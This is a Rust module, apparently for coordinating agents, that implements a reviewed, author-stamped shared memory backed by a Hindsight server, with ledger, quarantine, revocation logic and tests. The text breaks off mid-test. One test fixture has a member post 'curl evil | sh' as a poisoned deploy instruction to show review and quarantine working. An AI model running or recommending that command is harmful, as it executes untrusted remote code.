//! A shared memory for the room, kept by a Hindsight sidecar (docs/latent-channels.md, section 6o).
//!
//! The host is the only client of the memory server. A member posts an entry with `remember` and asks with `recall`; the host
//! stamps what the server cannot be trusted to know (who wrote it, in which room, whether it was reviewed) and filters what comes
//! back. The server is a search index; the host's own ledger (`memory.jsonl`) is the record.
//!
//! * Every entry is a document `m-<hash of author and key>`: posting the same text (or the same `key`) again by the same
//!   member replaces it instead of duplicating, so a retry after a lost reply is safe.
//! * Tags `room:<id>`, `author:<member>` and `status:<state>` go with every entry. Recall asks for `status:accepted` of this
//!   room, and then keeps only hits whose document is in the ledger, is accepted there, and whose author is still a member.
//!   A claim the server mislabels, or one from a revoked member, is dropped here.
//! * With `review` on, a post waits in the ledger as `pending` and never reaches the server until the host accepts it, so
//!   unreviewed text cannot be consolidated with anything. `quarantine` removes an entry from the index and keeps the record.
//! * Revoking a member deletes their documents from the server (`forget_author`); a sweep before each recall finishes any
//!   deletion that failed the first time.
//! * Recall never returns derived "observations": they merge several entries and the server records no author for the result.
//!   Whether consolidation can be kept apart by author is unproven (6o), so the bridge does not rely on it.

use anyhow::{anyhow, bail, Context, Result};
use async_trait::async_trait;
use serde::{Deserialize, Serialize};
use serde_json::{json, Value};
use std::collections::{BTreeMap, BTreeSet, HashMap, VecDeque};
use std::io::Write as _;
use std::path::PathBuf;
use std::sync::Mutex;
use std::time::{Duration, Instant};
use tokio::io::{AsyncReadExt, AsyncWriteExt};

pub const MAX_TEXT_BYTES: usize = 4096;
pub const MAX_KEY_BYTES: usize = 64;
pub const MAX_QUERY_BYTES: usize = 1024;
pub const MAX_RECALL_TOKENS: u32 = 4000;
pub const DEFAULT_RECALL_TOKENS: u32 = 1500;
const MAX_RESPONSE_BYTES: usize = 8 << 20;

#[derive(Debug, Clone, Copy, PartialEq, Eq, Serialize, Deserialize)]
#[serde(rename_all = "snake_case")]
pub enum Status {
    Pending,
    Accepted,
    Quarantined,
}

impl Status {
    #[must_use]
    pub fn as_str(self) -> &'static str {
        match self {
            Status::Pending => "pending",
            Status::Accepted => "accepted",
            Status::Quarantined => "quarantined",
        }
    }
}

/// One entry in the index, as the host sends it.
#[derive(Debug, Clone)]
pub struct Item {
    pub doc: String,
    pub text: String,
    pub tags: Vec<String>,
    pub metadata: BTreeMap<String, String>,
}

/// A recall, as the host sends it.
#[derive(Debug, Clone)]
pub struct RecallRequest {
    pub query: String,
    pub max_tokens: u32,
    /// Every tag must be on a hit.
    pub tags: Vec<String>,
}

/// A hit, as the server returns it.
#[derive(Debug, Clone, Default)]
pub struct RawHit {
    pub doc: Option<String>,
    pub text: String,
    pub tags: Vec<String>,
    /// The server's kind of memory ("world", "experience", "observation").
    pub kind: Option<String>,
}

#[async_trait]
pub trait Backend: Send + Sync {
    async fn retain(&self, bank: &str, item: &Item) -> Result<()>;
    async fn recall(&self, bank: &str, req: &RecallRequest) -> Result<Vec<RawHit>>;
    /// Delete a document and what was derived from it. A document the server does not have is not an error.
    async fn delete(&self, bank: &str, doc: &str) -> Result<()>;
}

// ---- Hindsight over HTTP ----

/// An unmodified Hindsight server (`ghcr.io/vectorize-io/hindsight`), reached over plain HTTP: run it beside the host.
#[derive(Debug, Clone)]
pub struct Hindsight {
    host: String,
    port: u16,
    base: String,
    pub timeout: Duration,
    /// Wait for the server to finish extracting and indexing before `remember` answers.
    pub wait: bool,
}

impl Hindsight {
    /// `url`: `http://127.0.0.1:8888/v1/default` (the part after the port is the tenant prefix).
    ///
    /// # Errors
    ///
    /// Returns an error if the URL is not a plain `http://host[:port][/prefix]` address.
    pub fn new(url: &str) -> Result<Self> {
        let rest = url.strip_prefix("http://").ok_or_else(|| anyhow!("the memory server URL must start with http:// (it runs beside the host)"))?;
        let (hostport, path) = rest.split_once('/').map_or((rest, ""), |(a, b)| (a, b));
        let (host, port) = match hostport.rsplit_once(':') {
            Some((h, p)) => (h, p.parse::<u16>().context("memory server port")?),
            None => (hostport, 80),
        };
        if host.is_empty() || host.contains(|c: char| c.is_whitespace() || c == '/') {
            bail!("bad memory server host");
        }
        Ok(Self {
            host: host.to_string(),
            port,
            base: if path.is_empty() { String::new() } else { format!("/{}", path.trim_end_matches('/')) },
            timeout: Duration::from_secs(120),
            wait: false,
        })
    }

    async fn request(&self, method: &str, path: &str, body: Option<&Value>) -> Result<(u16, Vec<u8>)> {
        let payload = body.map(serde_json::to_vec).transpose()?.unwrap_or_default();
        let head = format!(
            "{method} {}{path} HTTP/1.1\r\nHost: {}:{}\r\nConnection: close\r\nAccept: application/json\r\nContent-Type: application/json\r\nContent-Length: {}\r\n\r\n",
            self.base,
            self.host,
            self.port,
            payload.len()
        );
        let run = async {
            let mut s = tokio::net::TcpStream::connect((self.host.as_str(), self.port)).await.context("connect to the memory server")?;
            let mut out = head.into_bytes();
            out.extend_from_slice(&payload);
            s.write_all(&out).await?;
            let mut buf = Vec::new();
            (&mut s).take(MAX_RESPONSE_BYTES as u64 + 1).read_to_end(&mut buf).await?;
            if buf.len() > MAX_RESPONSE_BYTES {
                bail!("the memory server's answer is too large");
            }
            parse_response(&buf)
        };
        tokio::time::timeout(self.timeout, run).await.map_err(|_| anyhow!("the memory server did not answer in time"))?
    }
}

pub(crate) fn parse_response(buf: &[u8]) -> Result<(u16, Vec<u8>)> {
    let split = buf.windows(4).position(|w| w == b"\r\n\r\n").ok_or_else(|| anyhow!("malformed answer from the memory server"))?;
    let head = std::str::from_utf8(&buf[..split]).context("answer header")?;
    let mut lines = head.split("\r\n");
    let status: u16 = lines.next().unwrap_or("").split(' ').nth(1).and_then(|s| s.parse().ok()).ok_or_else(|| anyhow!("malformed status line"))?;
    let chunked = lines.any(|l| l.to_ascii_lowercase().replace(' ', "").starts_with("transfer-encoding:chunked"));
    let body = &buf[split + 4..];
    if !chunked {
        return Ok((status, body.to_vec()));
    }
    let (mut out, mut rest) = (Vec::new(), body);
    loop {
        let eol = rest.windows(2).position(|w| w == b"\r\n").ok_or_else(|| anyhow!("malformed chunked answer"))?;
        let size_text = std::str::from_utf8(&rest[..eol])?.split(';').next().unwrap_or("").trim();
        let size = usize::from_str_radix(size_text, 16).context("chunk size")?;
        rest = &rest[eol + 2..];
        if size == 0 {
            return Ok((status, out));
        }
        if rest.len() < size + 2 {
            bail!("truncated chunked answer");
        }
        out.extend_from_slice(&rest[..size]);
        rest = &rest[size + 2..];
    }
}

#[async_trait]
impl Backend for Hindsight {
    async fn retain(&self, bank: &str, item: &Item) -> Result<()> {
        let body = json!({
            "items": [{
                "content": item.text,
                "document_id": item.doc,
                "metadata": item.metadata,
                "tags": item.tags,
                "observation_scopes": "per_tag",
                "context": "shared room memory",
            }],
            "async": !self.wait,
        });
        let (code, out) = self.request("POST", &format!("/banks/{bank}/memories"), Some(&body)).await?;
        if code != 200 {
            bail!("the memory server refused the entry ({code}): {}", String::from_utf8_lossy(&out).chars().take(200).collect::<String>());
        }
        Ok(())
    }

    async fn recall(&self, bank: &str, req: &RecallRequest) -> Result<Vec<RawHit>> {
        let body = json!({
            "query": req.query,
            "max_tokens": req.max_tokens,
            "tags": req.tags,
            "tags_match": "all_strict",
            "types": ["world", "experience"],
        });
        let (code, out) = self.request("POST", &format!("/banks/{bank}/memories/recall"), Some(&body)).await?;
        if code == 404 {
            return Ok(vec![]); // no entries yet, so no bank yet
        }
        if code != 200 {
            bail!("the memory server refused the query ({code})");
        }
        let v: Value = serde_json::from_slice(&out).context("recall answer")?;
        Ok(v.get("results")
            .and_then(Value::as_array)
            .map(|rs| {
                rs.iter()
                    .map(|r| RawHit {
                        doc: r.get("document_id").and_then(Value::as_str).map(str::to_string),
                        text: r.get("text").and_then(Value::as_str).unwrap_or_default().to_string(),
                        tags: r.get("tags").and_then(Value::as_array).map(|t| t.iter().filter_map(|x| x.as_str().map(str::to_string)).collect()).unwrap_or_default(),
                        kind: r.get("type").and_then(Value::as_str).map(str::to_string),
                    })
                    .collect()
            })
            .unwrap_or_default())
    }

    async fn delete(&self, bank: &str, doc: &str) -> Result<()> {
        let (code, out) = self.request("DELETE", &format!("/banks/{bank}/documents/{doc}"), None).await?;
        if code == 200 || code == 204 || code == 404 {
            return Ok(());
        }
        bail!("the memory server would not delete the entry ({code}): {}", String::from_utf8_lossy(&out).chars().take(200).collect::<String>())
    }
}

// ---- an in-process index, for tests and for rooms with no memory server ----

/// Keeps entries in memory and recalls by shared words. A stand-in with the same contract, not a memory server.
#[derive(Default)]
pub struct InMemory {
    banks: Mutex<HashMap<String, BTreeMap<String, Item>>>,
    /// Count of calls to `delete`, so tests can see a revocation reach the index.
    pub deletes: Mutex<Vec<String>>,
}

impl InMemory {
    #[must_use]
    pub fn documents(&self, bank: &str) -> Vec<String> {
        self.banks.lock().expect("index lock").get(bank).map(|b| b.keys().cloned().collect()).unwrap_or_default()
    }
}

fn words(s: &str) -> BTreeSet<String> {
    s.split(|c: char| !c.is_alphanumeric()).filter(|w| w.len() > 2).map(str::to_lowercase).collect()
}

#[async_trait]
impl Backend for InMemory {
    async fn retain(&self, bank: &str, item: &Item) -> Result<()> {
        self.banks.lock().expect("index lock").entry(bank.to_string()).or_default().insert(item.doc.clone(), item.clone());
        Ok(())
    }

    async fn recall(&self, bank: &str, req: &RecallRequest) -> Result<Vec<RawHit>> {
        let q = words(&req.query);
        let g = self.banks.lock().expect("index lock");
        let mut hits: Vec<(usize, RawHit)> = g
            .get(bank)
            .into_iter()
            .flat_map(BTreeMap::values)
            .filter(|i| req.tags.iter().all(|t| i.tags.contains(t)))
            .filter_map(|i| {
                let n = words(&i.text).intersection(&q).count();
                (n > 0).then(|| (n, RawHit { doc: Some(i.doc.clone()), text: i.text.clone(), tags: i.tags.clone(), kind: Some("world".into()) }))
            })
            .collect();
        hits.sort_by(|a, b| b.0.cmp(&a.0).then(a.1.doc.cmp(&b.1.doc)));
        Ok(hits.into_iter().map(|h| h.1).collect())
    }

    async fn delete(&self, bank: &str, doc: &str) -> Result<()> {
        self.deletes.lock().expect("index lock").push(doc.to_string());
        if let Some(b) = self.banks.lock().expect("index lock").get_mut(bank) {
            b.remove(doc);
        }
        Ok(())
    }
}

// ---- the host's side ----

#[derive(Clone)]
pub struct MemoryConfig {
    /// The index. Often [`Hindsight`].
    pub backend: std::sync::Arc<dyn Backend>,
    /// The room's bank on the server and the `room:` tag. Letters, digits, `-` and `_`.
    pub room: String,
    /// Keep a member's post as `pending` until the host accepts it. Default false: posts are accepted at once.
    pub review: bool,
    /// Where the ledger is kept. `None`: memory only.
    pub ledger: Option<PathBuf>,
    pub max_entries: usize,
    pub max_entries_per_author: usize,
    pub posts_per_minute: u32,
}

impl MemoryConfig {
    #[must_use]
    pub fn new(backend: std::sync::Arc<dyn Backend>, room: &str) -> Self {
        Self { backend, room: room.to_string(), review: false, ledger: None, max_entries: 10_000, max_entries_per_author: 1_000, posts_per_minute: 30 }
    }
}

/// A room's memory on a Hindsight sidecar at `url`: `bank` names the room's bank, and the ledger lives in `dir` when the host has a state directory.
///
/// # Errors
///
/// Returns an error if the URL or bank name is not acceptable.
pub fn hindsight_memory(url: &str, bank: &str, review: bool, wait: bool, dir: Option<&std::path::Path>) -> Result<std::sync::Arc<SharedMemory>> {
    let mut h = Hindsight::new(url)?;
    h.wait = wait;
    let mut c = MemoryConfig::new(std::sync::Arc::new(h), bank);
    c.review = review;
    c.ledger = dir.map(|d| d.join("memory.jsonl"));
    Ok(std::sync::Arc::new(SharedMemory::new(c)?))
}

/// One entry in the ledger.
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct Entry {
    pub doc: String,
    pub author: String,
    pub text: String,
    pub status: Status,
    pub at_ms: u64,
}

/// What a recall returns for one hit.
#[derive(Debug, Clone, Serialize, Deserialize, PartialEq, Eq)]
pub struct Hit {
    pub doc: String,
    pub author: String,
    pub text: String,
    pub at_ms: u64,
}

#[derive(Debug, Clone, Serialize, Deserialize, PartialEq, Eq)]
pub struct Remembered {
    pub doc: String,
    pub status: Status,
}

#[derive(Serialize, Deserialize)]
#[serde(tag = "t", rename_all = "snake_case")]
enum Line {
    Put(Entry),
    Status { doc: String, status: Status },
    Del { doc: String },
}

pub struct SharedMemory {
    cfg: MemoryConfig,
    ledger: Mutex<BTreeMap<String, Entry>>,
    posts: Mutex<HashMap<String, VecDeque<Instant>>>,
    /// One writer at a time to the ledger file and the index, so an entry and its deletion cannot cross.
    io: tokio::sync::Mutex<()>,
}

fn now_ms() -> u64 {
    std::time::SystemTime::now().duration_since(std::time::UNIX_EPOCH).map_or(0, |d| d.as_millis().try_into().unwrap_or(u64::MAX))
}

/// The document id for an entry: the same author and key (or text) always give the same one.
#[must_use]
pub fn doc_id(author: &str, key_or_text: &str) -> String {
    let mut h = blake3::Hasher::new();
    h.update(b"playbox-memory\0");
    h.update(author.as_bytes());
    h.update(b"\0");
    h.update(key_or_text.as_bytes());
    format!("m-{}", &h.finalize().to_hex()[..32])
}

impl SharedMemory {
    /// # Errors
    ///
    /// Returns an error if the room name is not a plain name, or if the ledger exists but cannot be read.
    pub fn new(cfg: MemoryConfig) -> Result<Self> {
        if cfg.room.is_empty() || cfg.room.len() > 64 || !cfg.room.chars().all(|c| c.is_ascii_alphanumeric() || c == '-' || c == '_') {
            bail!("the room's memory name must be 1 to 64 letters, digits, - or _");
        }
        let mut ledger = BTreeMap::new();
        if let Some(p) = &cfg.ledger {
            if let Ok(text) = std::fs::read_to_string(p) {
                for l in text.lines() {
                    // A damaged line is skipped, like the feed's log: one bad write must not lose the room's memory.
                    match serde_json::from_str::<Line>(l) {
                        Ok(Line::Put(e)) => {
                            ledger.insert(e.doc.clone(), e);
                        }
                        Ok(Line::Status { doc, status }) => {
                            if let Some(e) = ledger.get_mut(&doc) {
                                e.status = status;
                            }
                        }
                        Ok(Line::Del { doc }) => {
                            ledger.remove(&doc);
                        }
                        Err(_) => {}
                    }
                }
            }
        }
        Ok(Self { cfg, ledger: Mutex::new(ledger), posts: Mutex::default(), io: tokio::sync::Mutex::new(()) })
    }

    fn append(&self, line: &Line) -> Result<()> {
        let Some(p) = &self.cfg.ledger else { return Ok(()) };
        let mut f = std::fs::OpenOptions::new().create(true).append(true).open(p).context("open the memory ledger")?;
        let mut s = serde_json::to_string(line)?;
        s.push('\n');
        f.write_all(s.as_bytes()).context("write the memory ledger")?;
        f.sync_data().ok();
        Ok(())
    }

    fn tags(&self, e: &Entry) -> Vec<String> {
        vec![format!("room:{}", self.cfg.room), format!("author:{}", e.author), format!("status:{}", e.status.as_str())]
    }

    fn item(&self, e: &Entry) -> Item {
        let metadata = BTreeMap::from([
            ("author_key".to_string(), e.author.clone()),
            ("status".to_string(), e.status.as_str().to_string()),
            ("posted_ms".to_string(), e.at_ms.to_string()),
        ]);
        Item { doc: e.doc.clone(), text: e.text.clone(), tags: self.tags(e), metadata }
    }

    fn rate_ok(&self, author: &str) -> bool {
        let mut g = self.posts.lock().expect("post lock");
        let q = g.entry(author.to_string()).or_default();
        let now = Instant::now();
        while q.front().is_some_and(|t| now.duration_since(*t) > Duration::from_secs(60)) {
            q.pop_front();
        }
        if q.len() >= self.cfg.posts_per_minute as usize {
            return false;
        }
        q.push_back(now);
        true
    }

    /// Post an entry for `author` (a member's id). `key` names the entry so that a later post with the same key replaces it.
    ///
    /// # Errors
    ///
    /// Returns a message for the member if the entry is refused or could not be stored.
    pub async fn remember(&self, author: &str, text: &str, key: Option<&str>) -> std::result::Result<Remembered, String> {
        if text.trim().is_empty() || text.len() > MAX_TEXT_BYTES {
            return Err(format!("an entry is 1 to {MAX_TEXT_BYTES} bytes of text"));
        }
        if let Some(k) = key {
            if k.is_empty() || k.len() > MAX_KEY_BYTES {
                return Err(format!("a key is 1 to {MAX_KEY_BYTES} bytes"));
            }
        }
        let doc = doc_id(author, key.unwrap_or(text));
        let status = if self.cfg.review { Status::Pending } else { Status::Accepted };
        let entry = Entry { doc: doc.clone(), author: author.to_string(), text: text.to_string(), status, at_ms: now_ms() };
        let _io = self.io.lock().await;
        let (replaces, same) = {
            let g = self.ledger.lock().expect("ledger lock");
            let old = g.get(&doc);
            if old.is_none() {
                if g.len() >= self.cfg.max_entries {
                    return Err("the room's memory is full".into());
                }
                if g.values().filter(|e| e.author == author).count() >= self.cfg.max_entries_per_author {
                    return Err("you have as many entries as one member may keep".into());
                }
            }
            (old.cloned(), old.is_some_and(|o| o.text == text && o.status != Status::Quarantined))
        };
        // A retry of the same entry is answered without work, and without using the member's post budget.
        if same {
            return Ok(Remembered { doc, status: replaces.map_or(status, |o| o.status) });
        }
        if replaces.as_ref().is_some_and(|o| o.status == Status::Quarantined) {
            return Err("that entry was quarantined by the host".into());
        }
        if !self.rate_ok(author) {
            return Err("too many entries this minute".into());
        }
        self.append(&Line::Put(entry.clone())).map_err(|e| format!("{e:#}"))?;
        if status == Status::Accepted {
            if let Err(e) = self.cfg.backend.retain(&self.cfg.room, &self.item(&entry)).await {
                // Undo, so the member's retry starts clean instead of finding an entry that is not in the index.
                let undo = match &replaces {
                    Some(o) => Line::Put(o.clone()),
                    None => Line::Del { doc: doc.clone() },
                };
                self.append(&undo).ok();
                return Err(format!("{e:#}"));
            }
        }
        self.ledger.lock().expect("ledger lock").insert(doc.clone(), entry);
        Ok(Remembered { doc, status })
    }

    /// Entries the room's members posted that match `query`: accepted, from a current member, newest information first as the server ranks it.
    /// `is_member` says whether a key belongs to a current member of the room.
    ///
    /// # Errors
    ///
    /// Returns a message for the member if the query is refused or the index cannot answer.
    pub async fn recall(&self, query: &str, max_tokens: Option<u32>, author: Option<&str>, is_member: &(dyn Fn(&str) -> bool + Sync)) -> std::result::Result<Vec<Hit>, String> {
        if query.trim().is_empty() || query.len() > MAX_QUERY_BYTES {
            return Err(format!("a query is 1 to {MAX_QUERY_BYTES} bytes of text"));
        }
        // Finish any revocation that did not complete, before anything is read.
        self.sweep(is_member).await;
        let mut tags = vec![format!("room:{}", self.cfg.room), "status:accepted".to_string()];
        if let Some(a) = author {
            tags.push(format!("author:{a}"));
        }
        let req = RecallRequest { query: query.to_string(), max_tokens: max_tokens.unwrap_or(DEFAULT_RECALL_TOKENS).clamp(100, MAX_RECALL_TOKENS), tags };
        let raw = self.cfg.backend.recall(&self.cfg.room, &req).await.map_err(|e| format!("{e:#}"))?;
        let g = self.ledger.lock().expect("ledger lock");
        let mut seen = BTreeSet::new();
        let mut out = Vec::new();
        for h in raw {
            // Derived memories merge entries and record no author; entries the server cannot attribute are not shown.
            if h.kind.as_deref() == Some("observation") {
                continue;
            }
            let Some(doc) = h.doc else { continue };
            let Some(e) = g.get(&doc) else { continue };
            if e.status != Status::Accepted || !is_member(&e.author) || author.is_some_and(|a| a != e.author) {
                continue;
            }
            // The tags the server returned must agree with the ledger, or the index was written by something else.
            if !h.tags.contains(&format!("author:{}", e.author)) || !h.tags.contains(&format!("room:{}", self.cfg.room)) {
                continue;
            }
            // One hit per document is enough for an agent reading context; the server may return several facts of one entry.
            if !seen.insert(doc.clone()) {
                continue;
            }
            out.push(Hit { doc, author: e.author.clone(), text: h.text, at_ms: e.at_ms });
        }
        Ok(out)
    }

    /// Delete every document of `author` from the index and the ledger. Returns how many were removed.
    /// Call it when a member is revoked; a document the server would not delete stays in the ledger and is retried.
    pub async fn forget_author(&self, author: &str) -> usize {
        let _io = self.io.lock().await;
        let docs: Vec<String> = self.ledger.lock().expect("ledger lock").values().filter(|e| e.author == author).map(|e| e.doc.clone()).collect();
        let mut n = 0;
        for d in docs {
            if self.cfg.backend.delete(&self.cfg.room, &d).await.is_ok() && self.append(&Line::Del { doc: d.clone() }).is_ok() {
                self.ledger.lock().expect("ledger lock").remove(&d);
                n += 1;
            }
        }
        n
    }

    /// Forget every author that is no longer a member (a revocation that reached this host as a notice, or one that failed).
    pub async fn sweep(&self, is_member: &(dyn Fn(&str) -> bool + Sync)) -> usize {
        let gone: BTreeSet<String> = self.ledger.lock().expect("ledger lock").values().filter(|e| !is_member(&e.author)).map(|e| e.author.clone()).collect();
        let mut n = 0;
        for a in gone {
            n += self.forget_author(&a).await;
        }
        n
    }

    /// The host's review: accept (index it), or quarantine (take it out of the index, keep the record).
    ///
    /// # Errors
    ///
    /// Returns an error if the entry is unknown or the index would not take the change.
    pub async fn set_status(&self, doc: &str, status: Status) -> Result<()> {
        let _io = self.io.lock().await;
        let mut e = self.ledger.lock().expect("ledger lock").get(doc).cloned().ok_or_else(|| anyhow!("no such entry"))?;
        if e.status == status {
            return Ok(());
        }
        e.status = status;
        match status {
            Status::Accepted => self.cfg.backend.retain(&self.cfg.room, &self.item(&e)).await?,
            Status::Pending | Status::Quarantined => self.cfg.backend.delete(&self.cfg.room, doc).await?,
        }
        self.append(&Line::Status { doc: doc.to_string(), status })?;
        self.ledger.lock().expect("ledger lock").insert(doc.to_string(), e);
        Ok(())
    }

    /// The entries waiting for review.
    #[must_use]
    pub fn pending(&self) -> Vec<Entry> {
        self.ledger.lock().expect("ledger lock").values().filter(|e| e.status == Status::Pending).cloned().collect()
    }

    /// Every entry the ledger holds, for the host's operator.
    #[must_use]
    pub fn entries(&self) -> Vec<Entry> {
        self.ledger.lock().expect("ledger lock").values().cloned().collect()
    }

    /// Put every accepted entry back in the index: after the memory server lost its data, or was replaced.
    ///
    /// # Errors
    ///
    /// Returns an error at the first entry the index refuses.
    pub async fn reindex(&self) -> Result<usize> {
        let _io = self.io.lock().await;
        let accepted: Vec<Entry> = self.ledger.lock().expect("ledger lock").values().filter(|e| e.status == Status::Accepted).cloned().collect();
        for e in &accepted {
            self.cfg.backend.retain(&self.cfg.room, &self.item(e)).await?;
        }
        Ok(accepted.len())
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use std::sync::Arc;

    fn mem(review: bool, ledger: Option<PathBuf>) -> (Arc<InMemory>, SharedMemory) {
        let idx = Arc::new(InMemory::default());
        let mut c = MemoryConfig::new(idx.clone(), "room1");
        c.review = review;
        c.ledger = ledger;
        (idx, SharedMemory::new(c).unwrap())
    }

    fn everyone(_: &str) -> bool {
        true
    }

    // REQ: MEM-1
    #[tokio::test]
    async fn an_entry_is_recalled_with_its_author_and_a_retry_does_not_duplicate() {
        let (idx, m) = mem(false, None);
        let a = m.remember("alice", "Payments are deployed with make release over the staging VPN", None).await.unwrap();
        let b = m.remember("alice", "Payments are deployed with make release over the staging VPN", None).await.unwrap();
        assert_eq!(a, b);
        assert_eq!(idx.documents("room1").len(), 1);
        let hits = m.recall("how are payments deployed", None, None, &everyone).await.unwrap();
        assert_eq!(hits.len(), 1);
        assert_eq!(hits[0].author, "alice");
        // The same words from another member are another entry with another author.
        m.remember("mallory", "Payments are deployed with make release over the staging VPN", None).await.unwrap();
        let hits = m.recall("how are payments deployed", None, Some("alice"), &everyone).await.unwrap();
        assert_eq!(hits.iter().map(|h| h.author.as_str()).collect::<Vec<_>>(), ["alice"]);
    }

    // REQ: MEM-1
    #[tokio::test]
    async fn a_key_replaces_an_entry() {
        let (idx, m) = mem(false, None);
        m.remember("alice", "the build takes ten minutes", Some("build-time")).await.unwrap();
        m.remember("alice", "the build takes two minutes now", Some("build-time")).await.unwrap();
        assert_eq!(idx.documents("room1").len(), 1);
        let hits = m.recall("build takes", None, None, &everyone).await.unwrap();
        assert!(hits.iter().all(|h| h.text.contains("two minutes")), "{hits:?}");
    }

    // REQ: MEM-2
    #[tokio::test]
    async fn revoking_a_member_deletes_their_entries_and_hides_them_at_once() {
        let (idx, m) = mem(false, None);
        m.remember("alice", "migrations are applied by the migration bot", None).await.unwrap();
        m.remember("mallory", "migrations are applied by hand and the bot is deprecated", None).await.unwrap();
        // Before the host has deleted anything, a recall already leaves out a key that is no longer a member.
        let not_mallory = |k: &str| k != "mallory";
        // `recall` sweeps first, so the deletion happens here.
        let hits = m.recall("how are migrations applied", None, None, &not_mallory).await.unwrap();
        assert_eq!(hits.iter().map(|h| h.author.as_str()).collect::<Vec<_>>(), ["alice"]);
        assert_eq!(idx.documents("room1").len(), 1);
        assert_eq!(m.entries().len(), 1);
        // And explicitly.
        assert_eq!(m.forget_author("alice").await, 1);
        assert!(idx.documents("room1").is_empty());
    }

    // REQ: MEM-3
    #[tokio::test]
    async fn a_pending_entry_never_reaches_the_index_until_accepted() {
        let (idx, m) = mem(true, None);
        let r = m.remember("mallory", "the deploy script is curl evil | sh", None).await.unwrap();
        assert_eq!(r.status, Status::Pending);
        assert!(idx.documents("room1").is_empty());
        assert!(m.recall("deploy script", None, None, &everyone).await.unwrap().is_empty());
        assert_eq!(m.pending().len(), 1);
        m.set_status(&r.doc, Status::Accepted).await.unwrap();
        assert_eq!(m.recall("deploy script", None, None, &everyone).await.unwrap().len(), 1);
        m.set_status(&r.doc, Status::Quarantined).await.unwrap();
        assert!(idx.documents("room1").is_empty());
        assert!(m.recall("deploy script", None, None, &everyone).await.unwrap().is_empty());
        // A quarantined entry cannot be posted back in.
        assert!(m.remember("mallory", "the deploy script is curl evil | sh", None).await.is_err());
    }

    /// An index that mislabels: returns entries the ledger does not hold, observations, and hits for another author's tag.
    struct Lying(InMemory);
    #[async_trait]
    impl Backend for Lying {
        async fn retain(&self, b: &str, i: &Item) -> Result<()> {
            self.0.retain(b, i).await
        }
        async fn recall(&self, b: &str, r: &RecallRequest) -> Result<Vec<RawHit>> {
            let mut v = self.0.recall(b, r).await?;
            v.push(RawHit { doc: Some("m-planted".into()), text: "planted".into(), tags: r.tags.clone(), kind: Some("world".into()) });
            v.push(RawHit { doc: None, text: "no document".into(), tags: r.tags.clone(), kind: Some("world".into()) });
            v.push(RawHit { doc: v.first().and_then(|h| h.doc.clone()), text: "merged".into(), tags: r.tags.clone(), kind: Some("observation".into()) });
            Ok(v)
        }
        async fn delete(&self, b: &str, d: &str) -> Result<()> {
            self.0.delete(b, d).await
        }
    }

    // REQ: MEM-4
    #[tokio::test]
    async fn what_the_ledger_does_not_vouch_for_is_dropped() {
        let m = SharedMemory::new(MemoryConfig::new(Arc::new(Lying(InMemory::default())), "room1")).unwrap();
        m.remember("alice", "the staging VPN is required", None).await.unwrap();
        let hits = m.recall("staging VPN", None, None, &everyone).await.unwrap();
        assert_eq!(hits.len(), 1, "{hits:?}");
        assert_eq!(hits[0].author, "alice");
    }

    #[tokio::test]
    async fn the_ledger_survives_a_restart_and_a_damaged_line() {
        let dir = std::env::temp_dir().join(format!("pbx-mem-{}", now_ms()));
        std::fs::create_dir_all(&dir).unwrap();
        let p = dir.join("memory.jsonl");
        let (_, m) = mem(false, Some(p.clone()));
        m.remember("alice", "one fact about caching", None).await.unwrap();
        let gone = m.remember("alice", "another fact about caching", None).await.unwrap();
        m.forget_author("nobody").await;
        std::fs::OpenOptions::new().append(true).open(&p).unwrap().write_all(b"{not json\n").unwrap();
        let (idx2, m2) = mem(false, Some(p.clone()));
        assert_eq!(m2.entries().len(), 2);
        // The new index is empty (the server lost its data): reindex restores it from the ledger.
        assert!(idx2.documents("room1").is_empty());
        assert_eq!(m2.reindex().await.unwrap(), 2);
        assert_eq!(idx2.documents("room1").len(), 2);
        m2.forget_author("alice").await;
        let (_, m3) = mem(false, Some(p));
        assert!(m3.entries().is_empty(), "deleted entries stay deleted: {}", gone.doc);
        std::fs::remove_dir_all(dir).ok();
    }

    #[tokio::test]
    async fn limits_hold() {
        let idx = Arc::new(InMemory::default());
        let mut c = MemoryConfig::new(idx, "room1");
        c.posts_per_minute = 3;
        c.max_entries_per_author = 100;
        let m = SharedMemory::new(c).unwrap();
        for i in 0..3 {
            m.remember("alice", &format!("fact number {i}"), None).await.unwrap();
        }
        assert!(m.remember("alice", "one too many", None).await.is_err());
        assert!(m.remember("bob", "bob has his own budget", None).await.is_ok());
        assert!(m.remember("bob", "", None).await.is_err());
        assert!(m.remember("bob", &"x".repeat(MAX_TEXT_BYTES + 1), None).await.is_err());
        assert!(m.recall("", None, None, &everyone).await.is_err());
        assert!(SharedMemory::new(MemoryConfig::new(Arc::new(InMemory::default()), "bad/name")).is_err());
    }

    #[test]
    fn the_response_parser_reads_plain_and_chunked_answers() {
        let plain = b"HTTP/1.1 200 OK\r\nContent-Length: 2\r\n\r\n{}";
        assert_eq!(parse_response(plain).unwrap(), (200, b"{}".to_vec()));
        let chunked = b"HTTP/1.1 200 OK\r\nTransfer-Encoding: chunked\r\n\r\n3\r\nabc\r\n2\r\nde\r\n0\r\n\r\n";
        assert_eq!(parse_response(chunked).unwrap(), (200, b"abcde".to_vec()));
        for bad in [&b""[..], b"HTTP/1.1", b"HTTP/1.1 200 OK\r\n\r\nx", b"HTTP/1.1 200 OK\r\nTransfer-Encoding: chunked\r\n\r\nzz\r\n", b"HTTP/1.1 200 OK\r\nTransfer-Encoding: chunked\r\n\r\n9\r\nab"] {
            let _ = parse_response(bad); // must not panic
        }
        assert!(parse_response(b"HTTP/1.1 200 OK\r\nTransfer-Encoding: chunked\r\n\r\n9\r\nab").is_err());
    }

    #[test]
    fn urls_are_plain_http() {
        assert!(Hindsight::new("http://127.0.0.1:8888/v1/default").is_ok());
        assert!(Hindsight::new("https://memory.example/v1").is_err());
        assert!(Hindsight::new("http://:80").is_err());
        assert!(Hindsight::new("http://host:notaport").is_err());
    }

    /// The HTTP client, against a throwaway server that checks the request it receives.
    #[tokio::test]
    async fn the_http_client_sends_what_hindsight_expects() {
        let l = tokio::net::TcpListener::bind("127.0.0.1:0").await.unwrap();
        let port = l.local_addr().unwrap().port();
        let server = tokio::spawn(async move {
            let mut seen = Vec::new();
            for answer in [r#"{"success":true}"#.to_string(), r#"{"results":[{"text":"fact","document_id":"d1","type":"world","tags":["room:r"]}]}"#.to_string(), String::new()] {
                let (mut s, _) = l.accept().await.unwrap();
                // Read the whole request: the headers, then as many body bytes as Content-Length says.
                let mut buf = Vec::new();
                loop {
                    let mut chunk = [0u8; 4096];
